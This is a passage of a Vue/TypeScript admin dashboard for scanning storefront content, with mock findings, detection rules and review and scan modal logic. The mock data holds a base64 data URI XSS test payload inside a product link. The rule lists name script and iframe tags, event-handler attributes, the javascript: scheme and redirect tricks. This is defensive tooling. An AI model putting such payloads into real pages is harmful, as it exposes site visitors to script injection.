    field: 'description',
    riskScore: 46,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Obfuscation',
    ruleName: 'Base64 Encoded JS Data URI',
    description: 'Obfuscated Base64 data URI string detected inside hyperlink tag.',
    matchedValue: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetBefore: '...Equipped with custom pump and high-res LCD screen. Sample gif: <a href="',
    contextSnippetMatched: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetAfter: '">Click for animation preview</a>...',
    lineOffset: 55,
    scannedAt: '2026-08-25 10:45 UTC',
    storefrontUrl: '/product/nzxt-kraken-elite-360-rgb/',
    adminEditUrl: '/admin/products?modal=edit&id=130'
  },
  {
    id: 'SEC-1018',
    contentType: 'Product',
    contentId: '142',
    contentName: 'Seasonic Focus GX-850 850W 80+ Gold Full Modular PSU',
    contentSlug: 'seasonic-focus-gx-850-psu',
    categoryName: 'Power Supplies',
    field: 'specifications',
    riskScore: 28,
    status: 'Needs Review',
    severity: 'Low',
    detector: 'Keyword',
    ruleName: 'Suspicious External Contact Token',
    description: 'Direct Telegram/WhatsApp handle found in specification field bypassing official support channel.',
    matchedValue: 't.me/direct_tech_support_bot',
    contextSnippetBefore: '...Warranty: 10 Years Manufacturer Warranty. For immediate claims contact: ',
    contextSnippetMatched: 't.me/direct_tech_support_bot',
    contextSnippetAfter: ' or visit Seasonic global portal...',
    lineOffset: 14,
    scannedAt: '2026-08-25 10:30 UTC',
    storefrontUrl: '/product/seasonic-focus-gx-850-psu/',
    adminEditUrl: '/admin/products?modal=edit&id=142'
  },
  {
    id: 'SEC-1010',
    contentType: 'Product',
    contentId: '150',
    contentName: 'Lian Li O11 Dynamic EVO Mid-Tower Case - Black',
    contentSlug: 'lian-li-o11-dynamic-evo',
    categoryName: 'PC Cases',
    field: 'description',
    riskScore: 0,
    status: 'Clean',
    severity: 'Low',
    detector: 'HTML',
    ruleName: 'Standard Clean Inspection',
    description: 'All HTML tags sanitized and compliant with Storefront standards.',
    matchedValue: 'None',
    contextSnippetBefore: '...Dual chamber chassis with flexible configuration. ',
    contextSnippetMatched: 'Compliant HTML',
    contextSnippetAfter: ' Supports up to 3x 360mm radiators...',
    lineOffset: 1,
    scannedAt: '2026-08-25 10:15 UTC',
    storefrontUrl: '/product/lian-li-o11-dynamic-evo/',
    adminEditUrl: '/admin/products?modal=edit&id=150'
  },
  {
    id: 'SEC-1004',
    contentType: 'Product',
    contentId: '155',
    contentName: 'AMD Ryzen 7 7800X3D 8-Core 16-Thread Desktop Processor',
    contentSlug: 'amd-ryzen-7-7800x3d',
    categoryName: 'Processors / CPU',
    field: 'description',
    riskScore: 0,
    status: 'Resolved',
    severity: 'Low',
    detector: 'Domain',
    ruleName: 'Prior Flag Resolved',
    description: 'Previously flagged unverified link corrected by staff administrator.',
    matchedValue: 'None (Resolved)',
    contextSnippetBefore: '...Built with 3D V-Cache technology for ultimate gaming performance. ',
    contextSnippetMatched: 'Sanitized Content',
    contextSnippetAfter: ' Compatible with AM5 socket motherboards...',
    lineOffset: 8,
    scannedAt: '2026-08-25 09:40 UTC',
    storefrontUrl: '/product/amd-ryzen-7-7800x3d/',
    adminEditUrl: '/admin/products?modal=edit&id=155'
  }
]);

// ==========================================
// Detection Rules Mock Data
// ==========================================
const rules = ref<DetectionRule[]>([
  // Keywords
  { id: 'R-KW-01', type: 'keyword', pattern: 'free crypto giveaway', category: 'Spam & Scam', severity: 'High', description: 'Detects crypto phishing and fraudulent giveaway phrases in product bodies', enabled: true, matchCount: 14, updatedAt: '2026-08-20' },
  { id: 'R-KW-02', type: 'keyword', pattern: 'whatsapp +', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks direct off-platform messaging solicitation numbers', enabled: true, matchCount: 8, updatedAt: '2026-08-18' },
  { id: 'R-KW-03', type: 'keyword', pattern: 'telegram @', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks unauthorized Telegram support contact strings', enabled: true, matchCount: 19, updatedAt: '2026-08-15' },
  { id: 'R-KW-04', type: 'keyword', pattern: 'viagra|cialis|casino bonus', category: 'Spam Blacklist', severity: 'Critical', description: 'Strict pharma and gambling spam keyword blacklist', enabled: true, matchCount: 42, updatedAt: '2026-08-10' },
  
  // Domains
  { id: 'R-DM-01', type: 'domain', pattern: 'casino-example.com', category: 'Gambling Blacklist', severity: 'Critical', description: 'Blacklisted affiliate casino redirect portal', enabled: true, matchCount: 3, updatedAt: '2026-08-22' },
  { id: 'R-DM-02', type: 'domain', pattern: 'free-giveaway-zone.xyz', category: 'Phishing Host', severity: 'Critical', description: 'Known phishing lure hosting fake reward claim forms', enabled: true, matchCount: 6, updatedAt: '2026-08-21' },
  { id: 'R-DM-03', type: 'domain', pattern: 'tracker-telemetry.biz', category: 'Tracking & Adware', severity: 'High', description: 'Unapproved third-party tracking pixel script host', enabled: true, matchCount: 1, updatedAt: '2026-08-19' },
  { id: 'R-DM-04', type: 'domain', pattern: 'free-file-vault-dl.com', category: 'Malicious Downloads', severity: 'Critical', description: 'Suspicious executable payload distribution domain', enabled: true, matchCount: 2, updatedAt: '2026-08-12' },

  // HTML
  { id: 'R-HT-01', type: 'html', pattern: '<script>', category: 'Dangerous Tags', severity: 'Critical', description: 'Strict ban on raw inline or external script tags in rich text', enabled: true, matchCount: 11, updatedAt: '2026-08-24' },
  { id: 'R-HT-02', type: 'html', pattern: '<iframe>', category: 'Embedded Content', severity: 'Critical', description: 'Disallows embedded third party frames and overlays', enabled: true, matchCount: 4, updatedAt: '2026-08-24' },
  { id: 'R-HT-03', type: 'html', pattern: '<object>', category: 'Plugin Objects', severity: 'Critical', description: 'Blocks legacy ActiveX and object execution containers', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-04', type: 'html', pattern: '<embed>', category: 'Plugin Objects', severity: 'Critical', description: 'Disallows binary payload embedding tags', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-05', type: 'html', pattern: '<base>', category: 'DOM Hijacking', severity: 'Critical', description: 'Prevents base URL redirection hijacking in rich descriptions', enabled: true, matchCount: 1, updatedAt: '2026-08-05' },

  // Attributes
  { id: 'R-AT-01', type: 'attribute', pattern: 'onerror', category: 'Event Handlers', severity: 'Critical', description: 'Blocks inline image / media error event handler execution', enabled: true, matchCount: 5, updatedAt: '2026-08-23' },
  { id: 'R-AT-02', type: 'attribute', pattern: 'onclick', category: 'Event Handlers', severity: 'Critical', description: 'Disallows raw click event attributes in customer content', enabled: true, matchCount: 9, updatedAt: '2026-08-23' },
  { id: 'R-AT-03', type: 'attribute', pattern: 'onload', category: 'Event Handlers', severity: 'Critical', description: 'Blocks body and element load event injection triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-20' },
  { id: 'R-AT-04', type: 'attribute', pattern: 'javascript:', category: 'URI Scheme', severity: 'Critical', description: 'Blocks pseudo-protocol javascript execution in href attributes', enabled: true, matchCount: 7, updatedAt: '2026-08-15' },
  { id: 'R-AT-05', type: 'attribute', pattern: 'formaction', category: 'Form Redirection', severity: 'High', description: 'Blocks formaction override on input and button tags', enabled: true, matchCount: 0, updatedAt: '2026-08-08' },

  // Redirects
  { id: 'R-RD-01', type: 'redirect', pattern: 'http-equiv="refresh"', category: 'Meta Navigation', severity: 'Critical', description: 'Disallows automated client-side meta refresh triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-22' },
  { id: 'R-RD-02', type: 'redirect', pattern: 'window.location', category: 'DOM Redirection', severity: 'Critical', description: 'Detects JavaScript navigation hijacking attempts', enabled: true, matchCount: 1, updatedAt: '2026-08-18' },
  { id: 'R-RD-03', type: 'redirect', pattern: 'bit.ly/|tinyurl.com/', category: 'URL Shorteners', severity: 'Medium', description: 'Flags obfuscated shortener URLs that hide actual destinations', enabled: true, matchCount: 18, updatedAt: '2026-08-14' }
]);

const visibleSubTabs = computed(() => {
  const tabs = [];
  if (canViewKeywords.value) {
    tabs.push({ id: 'keywords', label: 'Keywords', count: detectionRulesSummary.value.keyword_rules });
  }
  if (canViewDomains.value) {
    tabs.push({ id: 'domains', label: 'Domains', count: detectionRulesSummary.value.domain_rules });
  }
  if (canViewHiddenContent.value) {
    tabs.push({ id: 'hidden_content', label: 'Hidden Content', count: detectionRulesSummary.value.hidden_content_rules });
  }
  if (canViewObfuscation.value) {
    tabs.push({ id: 'obfuscation', label: 'Obfuscation', count: detectionRulesSummary.value.obfuscation_rules });
  }
  if (canViewRedirects.value) {
    tabs.push({ id: 'redirects', label: 'Redirect Rules', count: detectionRulesSummary.value.redirect_rules });
  }
  if (canViewHtmlAttributeRules.value) {
    tabs.push({ id: 'attributes', label: 'Dangerous Attributes', count: detectionRulesSummary.value.html_attribute_rules });
  }
  if (canViewHtmlTagRules.value) {
    tabs.push({ id: 'html', label: 'Dangerous HTML', count: detectionRulesSummary.value.html_tag_rules });
  }
  return tabs;
});

// ==========================================
// Filter State for Scan Results
// ==========================================
const searchQuery = ref('');
const debouncedSearch = refDebounced(searchQuery, 300);
const filterContentType = ref('all');
const filterStatus = ref('all');
const filterSeverity = ref('all');
const filterDetector = ref('all');
const filterCategory = ref('all');

// Pagination
const currentPage = ref(1);
const itemsPerPage = ref(10);

// Content Scans States & Fetching
const isContentScansLoading = ref(false);
const contentScansError = ref<string | null>(null);
const contentScansData = ref<ContentScan[]>([]);
const contentScansCount = ref(0);
const contentScansPages = ref(1);

const fetchContentScans = async () => {
  if (!canViewContentScans.value) return;

  isContentScansLoading.value = true;
  contentScansError.value = null;

  try {
    const params: ContentScansQueryParams = {
      page: currentPage.value,
      page_size: itemsPerPage.value
    };

    if (searchQuery.value.trim()) {
      params.search = searchQuery.value.trim();
    }
    if (filterContentType.value !== 'all') {
      params.content_type = filterContentType.value;
    }
    if (filterStatus.value !== 'all') {
      params.status = filterStatus.value;
    }

    const response = await contentSecurityService.getContentScans(params);
    contentScansData.value = response.results;
    contentScansCount.value = response.count;
    contentScansPages.value = response.pages;
  } catch (err: any) {
    contentScansError.value = extractErrorMessage(err, 'Failed to retrieve content scans.');
  } finally {
    isContentScansLoading.value = false;
  }
};

watch([debouncedSearch, filterContentType, filterStatus, itemsPerPage], () => {
  currentPage.value = 1;
  if (mainTab.value === 'results') {
    fetchContentScans();
  }
});

watch(currentPage, () => {
  if (mainTab.value === 'results') {
    fetchContentScans();
  }
});

const resetFilters = () => {
  searchQuery.value = '';
  filterContentType.value = 'all';
  filterStatus.value = 'all';
  filterSeverity.value = 'all';
  filterDetector.value = 'all';
  filterCategory.value = 'all';
  toastInfo('Filters have been reset.');
};

// Summary metrics computed
const summaryMetrics = computed(() => {
  const total = totalEntitiesScanned.value;
  const critical = findings.value.filter(f => f.status === 'Critical').length;
  const high = findings.value.filter(f => f.status === 'High Risk').length;
  const needsReview = findings.value.filter(f => f.status === 'Needs Review').length;
  const clean = total - (critical + high + needsReview);
  const cleanPercent = ((clean / total) * 100).toFixed(1);

  return {
    total,
    clean,
    cleanPercent,
    needsReview,
    high,
    critical
  };
});

// Recent findings for Overview
const recentFindings = computed(() => {
  return findings.value.slice(0, 5);
});

// ==========================================
// Modal State: Finding Details
// ==========================================
const isFindingDetailsLoading = ref(false);
const selectedFindingDetail = ref<ContentScanFindingDetail | null>(null);

const findingModalState = useAdminModalState<ContentScanFindingDetail>({
  getItems: async (id) => {
    if (mainTab.value !== 'findings') return null;
    if (!canViewFindings.value) return null;
    isFindingDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getContentScanFindingDetails(id);
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve finding details.');
      toastError(msg);
      return null;
    } finally {
      isFindingDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (mainTab.value === 'findings') {
      toastError(`Finding #${id} could not be resolved.`);
      findingModalState.closeModal({ replace: true });
    }
  }
});

watch(() => findingModalState.activeEntity.value, (newEntity) => {
  if (newEntity && mainTab.value === 'findings') {
    selectedFindingDetail.value = newEntity;
  }
}, { immediate: true });

watch(() => findingModalState.isView.value, (isView) => {
  if (!isView) {
    selectedFindingDetail.value = null;
  }
}, { immediate: true });

const openFindingDetail = (finding: { id: number | string }) => {
  if (!canViewFindings.value) {
    toastError('You do not have permission to view finding details.');
    return;
  }
  if (mainTab.value !== 'findings') {
    mainTab.value = 'findings';
  }
  findingModalState.openView(finding.id);
};

const closeFindingDetail = () => {
  findingModalState.closeModal();
};

// ==========================================
// Modal State: Finding Review
// ==========================================
const isReviewModalOpen = ref(false);
const reviewTargetFinding = ref<{
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
} | null>(null);

const reviewForm = ref<{
  review_status: 'FALSE_POSITIVE' | 'CONFIRMED' | '';
  review_note: string;
}>({
  review_status: 'FALSE_POSITIVE',
  review_note: ''
});

const isReviewSubmitting = ref(false);
const reviewFormError = ref<string | null>(null);

const openFindingReview = (finding: {
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
}) => {
  if (!canReviewFinding.value) {
    toastError('You do not have permission to review content scan findings.');
    return;
  }
  reviewTargetFinding.value = finding;
  reviewForm.value = {
    review_status: (finding.review_status === 'CONFIRMED' || finding.review_status === 'FALSE_POSITIVE')
      ? (finding.review_status as 'CONFIRMED' | 'FALSE_POSITIVE')
      : 'FALSE_POSITIVE',
    review_note: finding.review_note || ''
  };
  reviewFormError.value = null;
  isReviewModalOpen.value = true;
};

const closeFindingReview = () => {
  if (isReviewSubmitting.value) return;
  isReviewModalOpen.value = false;
  reviewTargetFinding.value = null;
  reviewFormError.value = null;
};

const submitFindingReview = async () => {
  if (!canReviewFinding.value) {
    toastError('You do not have permission to review content scan findings.');
    return;
  }
  if (!reviewTargetFinding.value) return;

  const status = reviewForm.value.review_status;
  if (!status || (status !== 'FALSE_POSITIVE' && status !== 'CONFIRMED')) {
    reviewFormError.value = 'Please select a valid review decision (False Positive or Confirmed Threat).';
    return;
  }

  const note = reviewForm.value.review_note;
  if (note && note.length > 2000) {
    reviewFormError.value = 'Review note cannot exceed 2000 characters.';
    return;
  }

  reviewFormError.value = null;
  isReviewSubmitting.value = true;

  try {
    const findingId = reviewTargetFinding.value.id;
    const payload: ContentScanFindingReviewRequest = {
      review_status: status
    };
    if (note !== undefined && note !== null && note.trim() !== '') {
      payload.review_note = note.trim();
    } else if (note === '') {
      payload.review_note = '';
    }

    const updated = await contentSecurityService.reviewContentScanFinding(findingId, payload);
    toastSuccess(`Finding #${findingId} review submitted successfully.`);
    closeFindingReview();

    // If currently viewing details for this finding, refresh details
    if (findingModalState.isView.value && selectedFindingDetail.value && String(selectedFindingDetail.value.id) === String(findingId)) {
      try {
        const refreshed = await contentSecurityService.getContentScanFindingDetails(findingId);
        selectedFindingDetail.value = refreshed;
      } catch {
        selectedFindingDetail.value = updated;
      }
    }

    // Refresh findings list to preserve filters, search, and pagination
    await fetchFindings();
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to submit finding review.');
    reviewFormError.value = msg;
    toastError(msg);
  } finally {
    isReviewSubmitting.value = false;
  }
};

// ==========================================
// Modal State: Finding Resolve
// ==========================================
const isResolveModalOpen = ref(false);
const resolveTargetFinding = ref<{
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
} | null>(null);

const resolveForm = ref<{
  review_note: string;
}>({
  review_note: ''
});

const isResolveSubmitting = ref(false);
const resolveFormError = ref<string | null>(null);

const openFindingResolve = (finding: {
  id: number;
  scan?: number;
  content_type?: string;
  detector?: string;
  category?: string;
  severity?: string;
  matched_value?: string;
  review_status?: string;
  review_note?: string | null;
}) => {
  if (!canResolveFinding.value) {
    toastError('You do not have permission to resolve content scan findings.');
    return;
  }
  resolveTargetFinding.value = finding;
  resolveForm.value = {
    review_note: finding.review_note || ''
  };
  resolveFormError.value = null;
  isResolveModalOpen.value = true;
};

const closeFindingResolve = () => {
  if (isResolveSubmitting.value) return;
  isResolveModalOpen.value = false;
  resolveTargetFinding.value = null;
  resolveFormError.value = null;
};

const submitFindingResolve = async () => {
  if (!canResolveFinding.value) {
    toastError('You do not have permission to resolve content scan findings.');
    return;
  }
  if (!resolveTargetFinding.value) return;

  const note = resolveForm.value.review_note;
  if (note && note.length > 2000) {
    resolveFormError.value = 'Resolution note cannot exceed 2000 characters.';
    return;
  }

  resolveFormError.value = null;
  isResolveSubmitting.value = true;

  try {
    const findingId = resolveTargetFinding.value.id;
    const payload: ContentScanFindingResolveRequest = {};
    if (note !== undefined && note !== null && note.trim() !== '') {
      payload.review_note = note.trim();
    } else if (note === '') {
      payload.review_note = '';
    }

    const updated = await contentSecurityService.resolveContentScanFinding(findingId, payload);
    toastSuccess(`Finding #${findingId} marked as resolved successfully.`);
    closeFindingResolve();

    // If currently viewing details for this finding, refresh details
    if (findingModalState.isView.value && selectedFindingDetail.value && String(selectedFindingDetail.value.id) === String(findingId)) {
      try {
        const refreshed = await contentSecurityService.getContentScanFindingDetails(findingId);
        selectedFindingDetail.value = refreshed;
      } catch {
        selectedFindingDetail.value = updated;
      }
    }

    // Refresh findings list to preserve filters, search, and pagination
    await fetchFindings();
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to resolve content scan finding.');
    resolveFormError.value = msg;
    toastError(msg);
  } finally {
    isResolveSubmitting.value = false;
  }
};

const isScanDetailModalOpen = ref(false);
const selectedContentScan = ref<ContentScanDetail | null>(null);

const openScanDetail = async (scan: ContentScan) => {
  try {
    const details = await contentSecurityService.getContentScanDetails(scan.id);
    selectedContentScan.value = details;
    isScanDetailModalOpen.value = true;
  } catch (err: any) {
    toastError(extractErrorMessage(err, 'Failed to load scan details.'));
  }
};

const closeScanDetail = () => {
  isScanDetailModalOpen.value = false;
  selectedContentScan.value = null;
};

// ==========================================
// Scan Action & Mode Selection
// ==========================================
export type ScanMode = 'specific' | 'content_type' | 'everything';

const scanMode = ref<ScanMode>('specific');
const selectedScanContentType = ref<string>('Product');
const selectedScanObjectId = ref<string | number>('');
const scanFieldsInput = ref<string>('');

const availableScanObjects = ref<Array<{ id: string | number; label: string; sublabel?: string; type: string; typeLabel: string }>>([]);
const isScanObjectsLoading = ref(false);
const scanObjectSearchQuery = ref('');
const debouncedScanObjectQuery = refDebounced(scanObjectSearchQuery, 300);

const scanProductService = useProductService();
const scanCategoryService = useCategoryService();
const scanBrandService = useBrandService();
const scanBlogService = useBlogService();

const supportedContentTypes = computed(() => [
  { value: 'Product', label: 'Products' },
  { value: 'Category', label: 'Categories' },
  { value: 'Brand', label: 'Brands' },
  { value: 'Blog', label: 'Blog Posts' }
]);

const fetchAvailableScanObjects = async () => {
  if (scanMode.value !== 'specific') return;
  isScanObjectsLoading.value = true;
  
  try {
    const query = debouncedScanObjectQuery.value.trim();
    let list: Array<{ id: string | number; label: string; sublabel?: string; type: string; typeLabel: string }> = [];

    // Fetch from all supported endpoints concurrently
    const [productsRes, categoriesRes, brandsRes, blogsRes] = await Promise.allSettled([
      scanProductService.getProductsList({ search: query, page_size: 10 }),
      scanCategoryService.getCategoriesList({ search: query, page_size: 10 }),
      scanBrandService.getBrandsList({ search: query }),
      scanBlogService.getPosts({ query })
    ]);

    if (productsRes.status === 'fulfilled') {
      list.push(...(productsRes.value.results || []).map(p => ({
        id: p.id,
        label: p.name || (p as any).title || `Product #${p.id}`,
        sublabel: p.slug ? `slug: ${p.slug}` : `ID: ${p.id}`,
        type: 'Product',
        typeLabel: 'Product'
      })));
    }
    
    if (categoriesRes.status === 'fulfilled') {
      list.push(...(categoriesRes.value.results || []).map(c => ({
        id: c.id,
        label: c.name || `Category #${c.id}`,
        sublabel: c.slug ? `slug: ${c.slug}` : `ID: ${c.id}`,
        type: 'Category',
        typeLabel: 'Category'
      })));
    }

    if (brandsRes.status === 'fulfilled') {
      const bData = (brandsRes.value as any).value || brandsRes.value || [];
      const brandList = Array.isArray(bData) ? bData : (bData.results || []);
      list.push(...brandList.map((b: any) => ({
        id: b.id,
        label: b.name || `Brand #${b.id}`,
        sublabel: b.slug ? `slug: ${b.slug}` : `ID: ${b.id}`,
        type: 'Brand',
        typeLabel: 'Brand'
      })));
    }

    if (blogsRes.status === 'fulfilled') {
      const pData = (blogsRes.value as any).value || blogsRes.value || [];
      const postList = Array.isArray(pData) ? pData : (pData.results || []);
      list.push(...postList.map((p: any) => ({
        id: p.id,
        label: p.title || `Post #${p.id}`,
        sublabel: p.slug ? `slug: ${p.slug}` : `ID: ${p.id}`,
        type: 'Blog',
        typeLabel: 'Blog Post'
      })));
    }

    availableScanObjects.value = list;

    // Do not auto-select to avoid overwriting user selection when searching
    if (list.length > 0 && (!selectedScanObjectId.value || !list.some(item => String(item.id) === String(selectedScanObjectId.value) && item.type === selectedScanContentType.value))) {
      // We no longer auto-select the first item because it can be jarring
    }
  } catch (err) {
    console.error('Failed to fetch scannable objects:', err);
    availableScanObjects.value = [];
  } finally {
    isScanObjectsLoading.value = false;
  }
};

watch([debouncedScanObjectQuery, scanMode], ([newQuery, newMode]) => {
  if (newMode === 'specific') {
    fetchAvailableScanObjects();
  }
});

const runFullScan = () => {
  scanMode.value = 'specific';
  selectedScanContentType.value = 'Product';
  selectedScanObjectId.value = '';
  scanObjectSearchQuery.value = '';
  scanFieldsInput.value = '';
  isRunScanModalOpen.value = true;
  fetchAvailableScanObjects();
};

const isSubmittingScanRun = ref(false);

const submitScanRun = async () => {
  if (isSubmittingScanRun.value) return;

  if (scanMode.value === 'specific') {
    if (!selectedScanContentType.value || selectedScanObjectId.value === '' || selectedScanObjectId.value === null || selectedScanObjectId.value === undefined) {
      toastError('Please select a valid content type and target object to scan.');
      return;
    }

    isSubmittingScanRun.value = true;

    try {
      const payload: ContentScanRunRequest = {
        content_type: selectedScanContentType.value.trim().toUpperCase(),
        object_id: Number(selectedScanObjectId.value)
      };

      if (scanFieldsInput.value.trim()) {
        const fields = scanFieldsInput.value
          .split(',')
          .map((f: string) => f.trim())
          .filter((f: string) => f !== '');
        if (fields.length > 0) {
          payload.field_names = fields;
        }
      }

      await contentSecurityService.runContentScan(payload);
      toastSuccess('Content security scan completed successfully.');
      isRunScanModalOpen.value = false;
      fetchContentScans();
    } catch (err: any) {
      toastError(err.message || 'Failed to run content scan.');
    } finally {
      isSubmittingScanRun.value = false;
    }
  } else if (scanMode.value === 'content_type') {
    toastError('Scanning an entire content type is not currently supported by the backend.');
  } else if (scanMode.value === 'everything') {
    toastError('Full system scanning ("Everything") is not currently supported by the backend.');
  }
};



// ==========================================
// Modal State: Keyword Rule Details (View, Edit & Delete)
// ==========================================
const isKeywordDetailsLoading = ref(false);
const selectedKeywordRule = ref<KeywordRuleDetail | null>(null);
const editingKeywordRuleId = ref<number | null>(null);
const isSubmittingKeywordEdit = ref(false);
const isDeletingKeywordRule = ref(false);
const deletingKeywordRule = ref<{ id: number; keyword: string } | null>(null);

const keywordEditForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const originalKeywordRuleData = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
} | null>(null);

const keywordModalState = useAdminModalState<KeywordRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'keywords') return null;
    isKeywordDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getKeywordRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve keyword rule details.');
      toastError(msg);
      return null;
    } finally {
      isKeywordDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'keywords') {
      toastError(`Keyword Rule #${id} could not be resolved.`);
      keywordModalState.closeModal({ replace: true });
    }
  }
});

watch(() => keywordModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'keywords') {
    selectedKeywordRule.value = newEntity;

    if (keywordModalState.isEdit.value) {
      if (!canEditKeywordRule.value) {
        toastError('You do not have permission to edit keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      editingKeywordRuleId.value = newEntity.id;
      keywordEditForm.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalKeywordRuleData.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (keywordModalState.isDelete.value) {
      if (!canDeleteKeywordRule.value) {
        toastError('You do not have permission to delete keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingKeywordRule.value) {
        deletingKeywordRule.value = {
          id: newEntity.id,
          keyword: newEntity.keyword || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => keywordModalState.isView.value, (isView) => {
  if (!isView && !keywordModalState.isEdit.value && !keywordModalState.isDelete.value) {
    selectedKeywordRule.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingKeywordRuleId.value = null;
    originalKeywordRuleData.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingKeywordRule.value = null;
  } else if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    keywordModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openKeywordViewModal = (id: number | string) => {
  if (!canViewKeywords.value) {
    toastError('You do not have permission to view keyword rules.');
    return;
  }
  keywordModalState.openView(id);
};

const closeKeywordViewModal = () => {
  keywordModalState.closeModal();
};

// ==========================================
// Modal State: Domain Rule Details (View) & Edit & Delete
// ==========================================
const isDomainDetailsLoading = ref(false);
const selectedDomainRule = ref<DomainRuleDetail | null>(null);
const editingDomainRuleId = ref<number | null>(null);
const isSubmittingDomainEdit = ref(false);
const isDeletingDomainRule = ref(false);
const deletingDomainRule = ref<{ id: number; domain: string } | null>(null);

const domainEditForm = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
}>({
  domain: '',
  category: 'MALWARE',
  severity: 'HIGH',
  match_type: 'SUBDOMAIN',
  is_enabled: true,
  description: ''
});

const originalDomainRuleData = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
} | null>(null);

const domainModalState = useAdminModalState<DomainRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'domains') return null;
    isDomainDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getDomainRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve domain rule details.');
      toastError(msg);
      return null;
    } finally {
      isDomainDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'domains') {
      toastError(`Domain Rule #${id} could not be resolved.`);
      domainModalState.closeModal({ replace: true });
    }
  }
});

watch(() => domainModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'domains') {
    selectedDomainRule.value = newEntity;

    if (domainModalState.isEdit.value) {
      if (!canEditDomainRule.value) {
        toastError('You do not have permission to edit domain rules.');
        domainModalState.closeModal({ replace: true });
        return;
      }
      editingDomainRuleId.value = newEntity.id;
      domainEditForm.value = {
        domain: newEntity.domain || '',
        category: newEntity.category || 'MALWARE',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'SUBDOMAIN',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalDomainRuleData.value = {
        domain: newEntity.domain || '',
        category: newEntity.category || 'MALWARE',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'SUBDOMAIN',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (domainModalState.isDelete.value) {
      if (!canDeleteDomainRule.value) {
        toastError('You do not have permission to delete domain rules.');
        domainModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingDomainRule.value) {
        deletingDomainRule.value = {
          id: newEntity.id,
          domain: newEntity.domain || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => domainModalState.isView.value, (isView) => {
  if (!isView && !domainModalState.isEdit.value && !domainModalState.isDelete.value) {
    selectedDomainRule.value = null;
  }
}, { immediate: true });

watch(() => domainModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingDomainRuleId.value = null;
    originalDomainRuleData.value = null;
  }
}, { immediate: true });

watch(() => domainModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingDomainRule.value = null;
  } else if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    domainModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openDomainViewModal = (id: number | string) => {
  if (!canViewDomains.value) {
    toastError('You do not have permission to view domain rules.');
    return;
  }
  domainModalState.openView(id);
};

const closeDomainViewModal = () => {
